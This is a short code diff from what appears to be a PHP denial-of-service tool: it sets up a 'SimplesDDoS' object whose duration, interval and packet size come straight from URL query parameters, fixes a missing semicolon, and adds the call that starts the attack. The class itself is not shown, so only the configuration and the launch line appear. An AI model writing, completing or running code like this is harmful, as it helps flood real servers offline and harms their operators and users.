@@ -9,4 +9,5 @@ $ddosScript = new SimplesDDoS([
   'time' => $_GET['time'],
   'execution_interval' => $_GET['execution_interval'],
   'bytes' => $_GET['bytes']
-])
+]);
+$ddosScript->start();
